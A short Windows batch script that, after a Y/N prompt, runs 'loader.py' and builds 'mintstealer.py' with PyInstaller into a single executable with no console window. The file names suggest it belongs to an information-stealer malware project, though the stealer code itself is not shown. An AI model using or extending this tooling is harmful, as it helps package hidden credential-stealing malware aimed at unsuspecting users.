@ECHO OFF

:choice
set /P c=Are you sure you want to build[Y/N]?
if /I "%c%" EQU "Y" goto :build
if /I "%c%" EQU "N" goto :no_build
goto :choice

:build

loader.py
pyinstaller --onefile -w mintstealer.py
goto :finish
pause
exit

:no_build

echo build has cancelled
pause
exit

:finish

echo build has finished
pause
exit
